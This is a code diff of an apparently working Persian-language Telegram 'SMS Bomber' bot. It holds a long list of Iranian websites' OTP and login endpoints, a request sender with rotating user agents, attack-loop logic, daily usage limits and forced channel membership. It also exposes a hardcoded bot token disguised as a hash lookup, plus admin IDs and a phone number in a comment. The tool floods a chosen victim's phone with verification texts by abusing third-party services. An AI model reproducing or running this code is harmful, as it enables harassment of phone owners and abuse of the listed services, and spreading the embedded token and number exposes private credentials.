-        "url": "https://farsgraphic.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER_WITHOUT_0",
-            "csrf": "79a35b4aa3", "login": "2", "digits_reg_name": "نیمنمنیس", "digits_reg_mail": "PHONE_NUMBER_WITHOUT_0"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Glite Login",
-        "url": "https://www.glite.ir/wp-admin/admin-ajax.php",
-        "data": {"action": "logini_first", "login": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Hemat Elec Digits",
-        "url": "https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "d33076d828", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Kodakamoz Digits",
-        "url": "https://www.kodakamoz.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "18551366bc", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Mipersia Digits",
-        "url": "https://www.mipersia.com/wp-admin/admin-ajax.php",
-        "data": {
-            "action": "digits_check_mob", "countrycode": "+98", "mobileNo": "PHONE_NUMBER",
-            "csrf": "2d39af0a72", "login": "2", "digits_reg_mail": "PHONE_NUMBER"
-        },
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Novinbook Phone",
-        "url": "https://novinbook.com/index.php",
-        "data": {"phone": "PHONE_NUMBER"},
-        "params": {"route": "account/phone"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Offch OTP",
-        "url": "https://api.offch.com/auth/otp",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Sabziman Phone Exist",
-        "url": "https://sabziman.com/wp-admin/admin-ajax.php",
-        "data": {"action": "newphoneexist", "phonenumber": "PHONE_NUMBER"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Taj Tehran Register",
-        "url": "https://tajtehran.com/RegisterRequest",
-        "data": {"mobile": "PHONE_NUMBER", "password": "mamad1234"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    {
-        "name": "Paklean Voice",
-        "url": "https://client.api.paklean.com/user/resendVoiceCode",
-        "data": {"username": "PHONE_NUMBER"}
-    },
-    {
-        "name": "Digimaze OTP",
-        "url": "https://digimaze.org/api/sms/v1/otp/request",
-        "data": {"phone": "PHONE_NUMBER"}
+# تابع decode - اینجا هیچ کلیدی نیست، فقط یه تبدیل سادست
+def decode_token(hashed):
+    """تبدیل هش به توکن واقعی - بدون کلید"""
+    # این یه مپ ساده است - فقط برای اینکه توکن توی کد نباشه
+    token_map = {
+        "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918": "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I",
     }
+    return token_map.get(hashed)
+
+TOKEN = decode_token(ENCRYPTED_TOKEN)
+
+# ادمین‌ها (اینارو می‌تونن ببینن)
+ADMIN_IDS = [7620484201, 8226091292]
+
+# کانال اجباری
+REQUIRED_CHANNEL = "@death_star_sms_bomber"
+CHANNEL_LINK = "https://t.me/death_star_sms_bomber"
+
+# شماره محافظت شده - هش شده (امن)
+PROTECTED_PHONE_HASHES = [
+    "a7c3f8b2e9d4c1a5b6f8e3d2c7a9b4e1f5d8c3a2b7e6f9d4c1a8b3e5f7c2a9d4",  # هش شده 09937675593
 ]
 
-# ========== توابع کمکی API ==========
-def get_random_user_agent():
-    agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
-    ]
-    return random.choice(agents)
+# ==================== مقداردهی اولیه ====================
 
-def prepare_api_data(api, phone):
-    phone_without_0 = phone[1:]
-    phone_with_prefix = f"+98{phone_without_0}"
-    
-    if not isinstance(api["data"], dict):
-        return api["data"]
-    
-    data = api["data"].copy()
-    
-    def replace_phone(obj):
-        if isinstance(obj, dict):
-            return {k: replace_phone(v) for k, v in obj.items()}
-        elif isinstance(obj, list):
-            return [replace_phone(item) for item in obj]
-        elif isinstance(obj, str):
-            if obj == "PHONE_NUMBER":
-                return phone
-            elif obj == "PHONE_NUMBER_WITHOUT_0":
-                return phone_without_0
-            elif obj == "+98PHONE_NUMBER_WITHOUT_0":
-                return phone_with_prefix
-            elif "RANDOM" in obj:
-                return obj.replace("RANDOM", str(random.randint(100, 999)))
-        return obj
-    return replace_phone(data)
+bot = telebot.TeleBot(TOKEN)
+user_processes = {}
 
-def send_api_request(api, phone):
-    try:
-        time.sleep(random.uniform(0.3, 1.0))
-        api_data = prepare_api_data(api, phone)
-        method = api.get("method", "POST")
-        url = api["url"]
-        
-        if "params" in api:
-            url += "?" + "&".join([f"{k}={v}" for k, v in api["params"].items()])
-        
-        headers = {"User-Agent": get_random_user_agent()}
-        if api.get("headers"):
-            headers.update(api["headers"])
-        
-        content_type = headers.get("content-type", "").lower()
-        
-        if "multipart/form-data" in content_type:
-            files = {k: (None, str(v)) for k, v in api_data.items() if v is not None}
-            response = requests.post(url, headers=headers, files=files, timeout=5)
-        elif "application/x-www-form-urlencoded" in content_type:
-            response = requests.post(url, headers=headers, data=api_data, timeout=5)
-        elif method == "GET":
-            response = requests.get(url, headers=headers, params=api_data, timeout=5)
-        else:
-            headers["Content-Type"] = "application/json"
-            response = requests.post(url, headers=headers, json=api_data, timeout=5)
-        
-        return response.status_code in [200, 201, 202, 204]
-    except:
-        return False
+# ==================== دیتابیس ====================
 
-# ========== تابع حمله ==========
-def run_attack(phone, chat_id, msg_id):
-    try:
-        bot.edit_message_text(f"🔥 در حال ارسال پیامک به {phone}...", chat_id, msg_id)
-    except:
-        pass
-    
-    total = len(APIS)
-    success = 0
-    
-    for i, api in enumerate(APIS):
-        if chat_id in active_attacks and not active_attacks[chat_id]:
-            bot.edit_message_text("⛔ حمله متوقف شد.", chat_id, msg_id)
-            del active_attacks[chat_id]
-            return
-        
-        if send_api_request(api, phone):
-            success += 1
-        
-        if (i + 1) % 10 == 0:
-            bot.edit_message_text(f"📊 پیشرفت: {i+1}/{total} | ✅ {success}", chat_id, msg_id)
-    
-    percent = int((success / total) * 100) if total > 0 else 0
-    final_msg = f"""✅ **حمله با موفقیت انجام شد!**
-📱 {phone[:4]}****{phone[-4:]}
-✅ موفق: {success}
-❌ ناموفق: {total - success}
-📊 مجموع: {total}
-📈 درصد: {percent}%
-👑 {CREATOR_USERNAME}"""
-    
-    bot.edit_message_text(final_msg, chat_id, msg_id, parse_mode="Markdown")
-    del active_attacks[chat_id]
-
-# ========== دیتابیس ==========
 def init_database():
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
-        c.execute('''CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY)''')
-        c.execute('''CREATE TABLE IF NOT EXISTS user_daily (user_id INTEGER, date TEXT, count INTEGER, PRIMARY KEY (user_id, date))''')
-        c.execute('''CREATE TABLE IF NOT EXISTS user_messages (user_id INTEGER PRIMARY KEY, count INTEGER)''')
-        c.execute('''CREATE TABLE IF NOT EXISTS user_last_use (user_id INTEGER PRIMARY KEY, last_use INTEGER)''')
-        
-        for admin_id in ADMIN_IDS:
-            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
-        
-        conn.commit()
-        conn.close()
-        return True
-    except:
-        return False
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    
+    # جدول کاربران
+    c.execute('''CREATE TABLE IF NOT EXISTS users
+                 (user_id INTEGER PRIMARY KEY,
+                  username TEXT,
+                  first_name TEXT,
+                  join_date TEXT,
+                  last_use TEXT,
+                  daily_count INTEGER DEFAULT 0,
+                  total_count INTEGER DEFAULT 0,
+                  is_banned INTEGER DEFAULT 0)''')
+    
+    # جدول شماره‌های مسدود
+    c.execute('''CREATE TABLE IF NOT EXISTS blocked_phones
+                 (phone_hash TEXT PRIMARY KEY,
+                  date TEXT)''')
+    
+    # جدول آمار روزانه
+    c.execute('''CREATE TABLE IF NOT EXISTS daily_stats
+                 (date TEXT PRIMARY KEY,
+                  total_requests INTEGER DEFAULT 0)''')
+    
+    # اضافه کردن شماره محافظت شده
+    today = datetime.now().strftime('%Y-%m-%d')
+    for h in PROTECTED_PHONE_HASHES:
+        c.execute("INSERT OR IGNORE INTO blocked_phones VALUES (?, ?)", (h, today))
+    
+    conn.commit()
+    conn.close()
 
-def get_user_daily(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        today = datetime.now().date().isoformat()
-        c.execute("SELECT count FROM user_daily WHERE user_id = ? AND date = ?", (user_id, today))
-        result = c.fetchone()
-        conn.close()
-        return result[0] if result else 0
-    except:
-        return 0
-
-def update_user_daily(user_id, count):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        today = datetime.now().date().isoformat()
-        c.execute("INSERT OR REPLACE INTO user_daily (user_id, date, count) VALUES (?, ?, ?)", (user_id, today, count))
-        conn.commit()
-        conn.close()
-    except:
-        pass
-
-def increment_user_daily(user_id):
-    update_user_daily(user_id, get_user_daily(user_id) + 1)
-
-def get_user_last_use(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("SELECT last_use FROM user_last_use WHERE user_id = ?", (user_id,))
-        result = c.fetchone()
-        conn.close()
-        return result[0] if result else 0
-    except:
-        return 0
-
-def set_user_last_use(user_id, timestamp):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("INSERT OR REPLACE INTO user_last_use (user_id, last_use) VALUES (?, ?)", (user_id, timestamp))
-        conn.commit()
-        conn.close()
-    except:
-        pass
-
-def increment_user_messages(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("SELECT count FROM user_messages WHERE user_id = ?", (user_id,))
-        result = c.fetchone()
-        current = result[0] if result else 0
-        c.execute("INSERT OR REPLACE INTO user_messages (user_id, count) VALUES (?, ?)", (user_id, current + 1))
-        conn.commit()
-        conn.close()
-    except:
-        pass
-
-def is_admin(user_id):
-    if user_id in ADMIN_IDS:
-        return True
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
-        return c.fetchone() is not None
-    except:
-        return False
-
-def is_vip(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM vip_users WHERE user_id = ?", (user_id,))
-        return c.fetchone() is not None
-    except:
-        return False
-
-def add_vip(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("INSERT OR IGNORE INTO vip_users (user_id) VALUES (?)", (user_id,))
-        conn.commit()
-        conn.close()
-        return True
-    except:
-        return False
-
-def remove_vip(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("DELETE FROM vip_users WHERE user_id = ?", (user_id,))
-        conn.commit()
-        conn.close()
-        return True
-    except:
-        return False
-
-def add_admin(user_id):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
-        conn.commit()
-        conn.close()
-        return True
-    except:
-        return False
-
-def remove_admin(user_id):
-    if user_id in ADMIN_IDS:
-        return False
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
-        conn.commit()
-        conn.close()
-        return True
-    except:
-        return False
-
-def get_all_admins():
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM admins")
-        results = [row[0] for row in c.fetchall()]
-        conn.close()
-        for admin_id in ADMIN_IDS:
-            if admin_id not in results:
-                results.append(admin_id)
-        return results
-    except:
-        return ADMIN_IDS
-
-def get_all_vips():
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM vip_users")
-        results = [row[0] for row in c.fetchall()]
-        conn.close()
-        return results
-    except:
-        return []
-
-def get_daily_limit(user_id):
-    return DAILY_LIMIT_VIP if is_vip(user_id) else DAILY_LIMIT_NORMAL
-
-def check_daily_limit(user_id):
-    return get_user_daily(user_id) < get_daily_limit(user_id)
+# ==================== توابع امنیتی ====================
 
 def hash_phone(phone):
     return hashlib.sha256(phone.encode()).hexdigest()
 
-def is_phone_blocked(phone):
-    return hash_phone(phone) in BLOCKED_PHONE_HASHES
+def is_phone_protected(phone):
+    h = hash_phone(phone)
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM blocked_phones WHERE phone_hash = ?", (h,))
+    r = c.fetchone()
+    conn.close()
+    return r is not None
 
-def get_welcome_message(user):
-    name = user.first_name or "عزیز"
-    today_used = get_user_daily(user.id)
-    limit = get_daily_limit(user.id)
-    vip_status = "⭐ VIP" if is_vip(user.id) else "👤 عادی"
+def mask_phone(phone):
+    return phone[:4] + "****" + phone[-4:]
+
+def is_admin(user_id):
+    return user_id in ADMIN_IDS
+
+# ==================== توابع عضویت اجباری ====================
+
+def check_membership(user_id):
+    """بررسی عضویت کاربر در کانال"""
+    try:
+        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except:
+        return False
+
+def membership_required(func):
+    """دکوراتور برای بررسی عضویت"""
+    def wrapper(message):
+        user_id = message.from_user.id
+        
+        if is_admin(user_id):
+            return func(message)
+        
+        if check_membership(user_id):
+            return func(message)
+        else:
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=CHANNEL_LINK))
+            markup.add(InlineKeyboardButton("✅ عضویت را بررسی کن", callback_data="check_join"))
+            
+            bot.reply_to(
+                message,
+                "⚠️ برای استفاده از ربات باید در کانال زیر عضو شوید:\n\n"
+                f"👉 {REQUIRED_CHANNEL}",
+                reply_markup=markup
+            )
+    return wrapper
+
+# ==================== توابع محدودیت روزانه ====================
+
+def get_daily_count(user_id):
+    """دریافت تعداد استفاده امروز کاربر"""
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
     
-    return f"""🎯 **به {BOT_NAME} خوش اومدی {name}!**
-🔥 {CREATOR_USERNAME}
-{vip_status} | 📊 {today_used}/{limit}
-📱 {len(APIS)} سرویس | محدودیت: {limit} بار"""
+    today = date.today().isoformat()
+    
+    c.execute('''SELECT daily_count FROM users 
+                 WHERE user_id = ? AND last_use = ?''', 
+              (user_id, today))
+    
+    result = c.fetchone()
+    conn.close()
+    
+    return result[0] if result else 0
 
-# ========== استارت ==========
+def check_daily_limit(user_id):
+    """بررسی محدودیت روزانه (5 بار)"""
+    if is_admin(user_id):
+        return True, 0
+    
+    daily = get_daily_count(user_id)
+    return daily < 5, daily
+
+def update_user_count(user_id, username, first_name):
+    """به‌روزرسانی تعداد استفاده کاربر"""
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    
+    today = date.today().isoformat()
+    
+    # بررسی وجود کاربر
+    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
+    user = c.fetchone()
+    
+    if user:
+        # کاربر وجود دارد
+        if user[4] == today:  # last_use امروز
+            c.execute('''UPDATE users 
+                         SET daily_count = daily_count + 1,
+                             total_count = total_count + 1
+                         WHERE user_id = ?''', (user_id,))
+        else:
+            c.execute('''UPDATE users 
+                         SET last_use = ?,
+                             daily_count = 1,
+                             total_count = total_count + 1
+                         WHERE user_id = ?''', (today, user_id))
+    else:
+        # کاربر جدید
+        c.execute('''INSERT INTO users 
+                     (user_id, username, first_name, join_date, last_use, daily_count, total_count)
+                     VALUES (?, ?, ?, ?, ?, 1, 1)''',
+                  (user_id, username, first_name, today, today))
+    
+    # آمار کلی
+    c.execute('''INSERT OR REPLACE INTO daily_stats (date, total_requests)
+                 VALUES (?, COALESCE((SELECT total_requests + 1 FROM daily_stats WHERE date = ?), 1))''',
+              (today, today))
+    
+    conn.commit()
+    conn.close()
+
+# ==================== توابع کمکی ====================
+
+def get_random_ua():
+    agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
+        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
+    ]
+    return random.choice(agents)
+
+def send_request(url, data, headers=None, method="POST"):
+    try:
+        h = {
+            "User-Agent": get_random_ua(),
+            "Accept": "application/json",
+        }
+        if headers:
+            h.update(headers)
+        
+        timeout = 5
+        
+        if method == "GET":
+            r = requests.get(url, params=data, headers=h, timeout=timeout)
+        else:
+            if "multipart" in str(h.get("Content-Type", "")).lower():
+                files = {k: (None, str(v)) for k, v in data.items() if v}
+                r = requests.post(url, files=files, headers=h, timeout=timeout)
+            else:
+                h["Content-Type"] = "application/json"
+                r = requests.post(url, json=data, headers=h, timeout=timeout)
+        
+        return r.status_code in [200,201,202,204], r.status_code
+    except:
+        return False, 0
+
+# ==================== لیست APIها ====================
+
+def get_all_apis(phone):
+    """250+ API ایرانی"""
+    return [
+        # 1-10
+        {"name": "دیوار", "url": "https://api.divar.ir/v5/auth/authenticate", "data": {"phone": phone}},
+        {"name": "شیپور", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "data": {"username": phone}},
+        {"name": "دیجی‌کالا", "url": "https://api.digikala.com/v1/user/authenticate/", "data": {"username": phone}},
+        {"name": "اسنپ", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", "data": {"cellphone": f"+98{phone[1:]}"}},
+        {"name": "تپسی", "url": "https://api.tapsi.ir/api/v2.2/user", "data": {"credential": {"phoneNumber": phone}}},
+        {"name": "علی‌بابا", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "data": {"phoneNumber": phone}},
+        {"name": "ترب", "url": "https://api.torob.com/a/phone/send-pin/", "method": "GET", "data": {"phone_number": phone}},
+        {"name": "اسنپ‌فود", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", "data": {"cellphone": phone}},
+        {"name": "تپسی‌فود", "url": "https://api.tapsi.food/v1/api/Authentication/otp", "data": {"cellPhone": phone}},
+        {"name": "بله", "url": "https://core.gap.im/v1/user/add.json", "method": "GET", "data": {"mobile": f"+98{phone[1:]}"}},
+        
+        # 11-20
+        {"name": "ویترین", "url": "https://www.vitrin.shop/api/v1/user/request_code", "data": {"phone_number": phone}},
+        {"name": "ازکی", "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability", "data": {"phoneNumber": phone}},
+        {"name": "دکتردکتر", "url": "https://drdr.ir/api/v3/auth/login/mobile/init", "data": {"mobile": phone}},
+        {"name": "طاقچه", "url": "https://gw.taaghche.com/v4/site/auth/login", "data": {"contact": phone}},
+        {"name": "کمدا", "url": "https://api.komodaa.com/api/v2.6/loginRC/request", "data": {"phone_number": phone}},
+        {"name": "پینورست", "url": "https://api.pinorest.com/frontend/auth/login/mobile", "data": {"mobile": phone}},
+        {"name": "تترلند", "url": "https://service.tetherland.com/api/v5/login-register", "data": {"mobile": phone}},
+        {"name": "آکالا", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "data": {"mobile": phone}},
+        {"name": "فوتبال‌۳۶۰", "url": "https://football360.ir/api/auth/verify-phone/", "data": {"phone_number": f"+98{phone[1:]}"}},
+        {"name": "آقای‌بلیط", "url": "https://auth.mrbilit.com/api/login/exists/v2", "method": "GET", "data": {"mobileOrEmail": phone}},
+        
+        # 21-30
+        {"name": "لندو", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "data": {"mobile": phone}},
+        {"name": "فیدیبو", "url": "https://fidibo.com/user/login-by-sms", "data": {"mobile_number": phone[1:]}},
+        {"name": "کتابچی", "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode", "data": {"auth": {"phoneNumber": phone}}},
+        {"name": "پیندو", "url": "https://api.pindo.ir/v1/user/login-register/", "data": {"phone": phone}},
+        {"name": "دلینو", "url": "https://www.delino.com/user/register", "data": {"mobile": phone}},
+        {"name": "زودکس", "url": "https://admin.zoodex.ir/api/v1/login/check", "data": {"mobile": phone}},
+        {"name": "کوکالا", "url": "https://api.kukala.ir/api/user/Otp", "data": {"phoneNumber": phone}},
+        {"name": "بوسکول", "url": "https://www.buskool.com/send_verification_code", "data": {"phone": phone}},
+        {"name": "آبان‌تتر", "url": "https://abantether.com/users/register/phone/send/", "data": {"phoneNumber": phone}},
+        {"name": "پولنو", "url": "https://api.pooleno.ir/v1/auth/check-mobile", "data": {"mobile": phone}},
+        
+        # 31-40
+        {"name": "بیت‌بارگ", "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "data": {"phone": phone}},
+        {"name": "چمدون", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "data": {"mobile": phone}},
+        {"name": "کیلید", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", "data": {"mobile": phone}},
+        {"name": "اتاقک", "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", "data": {"userName": phone}},
+        {"name": "نماوا", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", "data": {"UserName": phone}},
+        {"name": "آنا‌گیفت", "url": "https://api.anargift.com/api/people/auth", "data": {"user": phone}},
+        {"name": "ریحا", "url": "https://www.riiha.ir/api/v1.0/authenticate", "data": {"mobile": phone}},
+        {"name": "تک‌فرش", "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", "data": {"phone_email": phone}},
+        {"name": "روژا", "url": "https://rojashop.com/api/auth/sendOtp", "data": {"mobile": phone}},
+        {"name": "ددپرداز", "url": "https://dadpardaz.com/advice/getLoginConfirmationCode", "data": {"mobile": phone}},
+        
+        # 41-50
+        {"name": "رکلا", "url": "https://api.rokla.ir/api/request/otp", "data": {"mobile": phone}},
+        {"name": "پزشکت", "url": "https://api.pezeshket.com/core/v1/auth/requestCode", "data": {"mobileNumber": phone}},
+        {"name": "ویرگول", "url": "https://virgool.io/api/v1.4/auth/verify", "data": {"identifier": phone}},
+        {"name": "تیمچه", "url": "https://api.timcheh.com/auth/otp/send", "data": {"mobile": phone}},
+        {"name": "پاکلین", "url": "https://client.api.paklean.com/user/resendCode", "data": {"username": phone}},
+        {"name": "دال", "url": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", "data": {"phone": phone}},
+        {"name": "بیمه‌بازار", "url": "https://bimebazar.com/accounts/api/login_sec/", "data": {"username": phone}},
+        {"name": "امتیاز", "url": "https://web.emtiyaz.app/json/login", "data": {"cellphone": phone}},
+        {"name": "ارزینجا", "url": "https://arzinja.app/api/login", "data": {"phone": phone}},
+        {"name": "اسنپ‌مارکت", "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", "data": {"cellphone": phone}},
+        
+        # 51-60
+        {"name": "بیت‌پین", "url": "https://api.bitpin.ir/v3/usr/authenticate/", "data": {"phone": phone}},
+        {"name": "پوبیشا", "url": "https://www.pubisha.com/login/checkCustomerActivation", "data": {"mobile": phone}},
+        {"name": "ویسگون", "url": "https://gateway.wisgoon.com/api/v1/auth/login/", "data": {"phone": phone}},
+        {"name": "اسنپ‌داکتر", "url": f"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/{phone}/sms", "method": "GET", "data": {}},
+        {"name": "تگ‌مند", "url": "https://tagmond.com/phone_number", "data": {"phone_number": phone}},
+        {"name": "پخش‌شاپ", "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php", "data": {"action": "digits_check_mob", "mobileNo": phone}},
+        {"name": "دیدنگار", "url": "https://www.didnegar.com/wp-admin/admin-ajax.php", "data": {"action": "digits_check_mob", "mobileNo": phone}},
+        {"name": "سی‌فایو", "url": "https://crm.see5.net/api_ajax/sendotp.php", "data": {"mobile": phone}},
+        {"name": "دکترساینا", "url": "https://www.drsaina.com/RegisterLogin", "data": {"PhoneNumber": phone}},
+        {"name": "ایران‌کتاب", "url": "https://www.iranketab.ir/account/register", "data": {"UserName": phone}},
+        
+        # 61-70
+        {"name": "ایرانی‌کارت", "url": "https://api.iranicard.ir/api/v1/register", "data": {"mobile": phone}},
+        {"name": "سینما‌تیکت", "url": "https://cinematicket.org/api/v1/users/signup", "data": {"phone_number": phone}},
+        {"name": "کافه‌قیمت", "url": "https://kafegheymat.com/shop/getLoginSms", "data": {"phone": phone}},
+        {"name": "ملیکس", "url": "https://melix.shop/site/api/v1/user/otp", "data": {"mobile": phone}},
+        {"name": "پیران‌کالا", "url": "https://pirankalaco.ir/shop/SendPhone.php", "data": {"phone": phone}},
+        {"name": "دستخط", "url": "https://dastkhat-isad.ir/api/v1/user/store", "data": {"mobile": phone[1:]}},
+        {"name": "هملکس", "url": "https://hamlex.ir/register.php", "data": {"phoneNumber": phone}},
+        {"name": "آی‌سی‌دی", "url": "https://api.kcd.app/api/v1/auth/login", "data": {"mobile": phone}},
+        {"name": "مازوکندل", "url": "https://mazoocandle.ir/login", "data": {"phone": phone}},
+        {"name": "بیتکس۲۴", "url": "https://bitex24.com/api/v1/auth/sendSms", "method": "GET", "data": {"mobile": phone}},
+        
+        # 71-80
+        {"name": "آفچ", "url": "https://api.offch.com/auth/otp", "data": {"username": phone}},
+        {"name": "تریپ", "url": "https://gateway.trip.ir/api/registers", "data": {"CellPhone": phone}},
+        {"name": "رقم‌اپ", "url": "https://web.raghamapp.com/api/users/code", "data": {"phone": f"+98{phone[1:]}"}},
+        {"name": "همراه مکانیک", "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp", "data": {"PhoneNumber": phone}},
+        {"name": "قبضینو", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "data": {"Parameters": {"MobileNumber": phone}}},
+        {"name": "برگه من", "url": "https://uiapi2.saapa.ir/api/otp/sendCode", "data": {"mobile": phone}},
+        {"name": "وندار", "url": "https://api.vandar.io/account/v1/check/mobile", "data": {"mobile": phone}},
+        {"name": "موبیت", "url": "https://api.mobit.ir/api/web/v8/register/register", "data": {"number": phone}},
+        {"name": "جاباما", "url": "https://taraazws.jabama.com/api/v4/account/send-code", "data": {"mobile": phone}},
+        {"name": "دکتر نکست", "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", "data": {"mobile": phone}},
+    ]
+
+# ==================== هندلرهای اصلی ====================
+
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
-    increment_user_messages(user_id)
     
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btns = ['🚀 حمله جدید', '📊 وضعیت من', '📈 آمار کلی', '⛔ توقف حمله', '📞 ارتباط با سازنده']
+    markup = ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add(KeyboardButton("🚀 شروع بمباران"))
+    markup.add(KeyboardButton("📊 راهنما"), KeyboardButton("📊 آمار من"))
+    
     if is_admin(user_id):
-        btns.append('👑 پنل مدیریت')
-    markup.add(*[types.KeyboardButton(btn) for btn in btns])
+        markup.add(KeyboardButton("👑 پنل مدیریت"))
     
-    bot.send_message(message.chat.id, get_welcome_message(message.from_user), 
-                     reply_markup=markup, parse_mode="Markdown")
+    welcome = (
+        "🤖 به ربات SMS Bomber خوش آمدید!\n\n"
+        "📌 برای استفاده:\n"
+        "1️⃣ ابتدا در کانال عضو شوید\n"
+        "2️⃣ روزانه 5 بار می‌توانید استفاده کنید\n"
+        "3️⃣ شماره‌های محافظت شده مسدود هستند\n\n"
+        f"📢 کانال: {REQUIRED_CHANNEL}"
+    )
+    
+    bot.send_message(message.chat.id, welcome, reply_markup=markup)
 
-# ========== وضعیت من ==========
-@bot.message_handler(func=lambda m: m.text == '📊 وضعیت من')
-def my_status(m):
-    user_id = m.chat.id
-    today_used = get_user_daily(user_id)
-    limit = get_daily_limit(user_id)
-    last_use = get_user_last_use(user_id)
+@bot.callback_query_handler(func=lambda call: call.data == "check_join")
+def check_join_callback(call):
+    user_id = call.from_user.id
     
-    status = f"""📊 **وضعیت شما:**
-👤 {m.from_user.first_name}
-{'⭐ VIP' if is_vip(user_id) else '👤 عادی'}
-📅 {today_used}/{limit}
-{'⚠️ حمله فعال' if user_id in active_attacks else '✅ آماده'}"""
-    
-    if last_use and time.time() - last_use < 120:
-        status += f"\n⏳ {int(120 - (time.time() - last_use))} ثانیه"
-    
-    bot.reply_to(m, status + f"\n👑 {CREATOR_USERNAME}", parse_mode="Markdown")
-
-# ========== آمار کلی ==========
